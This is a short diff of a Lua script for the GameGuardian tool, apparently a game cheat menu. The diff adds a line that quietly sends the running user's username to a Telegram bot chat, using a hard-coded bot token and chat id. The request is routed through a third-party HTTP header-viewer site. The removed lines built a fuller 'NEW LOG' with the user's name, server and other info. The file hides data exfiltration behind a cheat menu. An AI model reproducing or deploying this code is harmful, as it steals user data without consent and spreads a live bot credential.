@@ -31,10 +31,8 @@ SAMPMENU = 1
 
 gg.toast("Please wait ⏳")
 
-teltxtzz = "💥 NEW LOG 💥\n🟢 username = '.. username ..'\n🟢 NoName = '.. NoName ..'\n🟢 Server = '.. Server ..'\n🟢 info = '.. info ..'"
-
 local payloads = 
-'{"UrlBox":"https://api.telegram.org/bot6559999188:AAEUQgh9w0ktXa4sONx5mLk_nFCwHylyuN0/sendMessage?chat_id=6475604987&text=' .. teltxtzz ..'","AgentList":"Internet Explorer","VersionsList":"HTTP/1.1","MethodList":"POST"}'
+'{"UrlBox":"https://api.telegram.org/bot6559999188:AAEUQgh9w0ktXa4sONx5mLk_nFCwHylyuN0/sendMessage?chat_id=6475604987&text=🟢username = '.. username ..'","AgentList":"Internet Explorer","VersionsList":"HTTP/1.1","MethodList":"POST"}'
 
 recxx = gg.makeRequest("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", {
 ['Authorization'] = 'Maybe you need an Authorization header?',
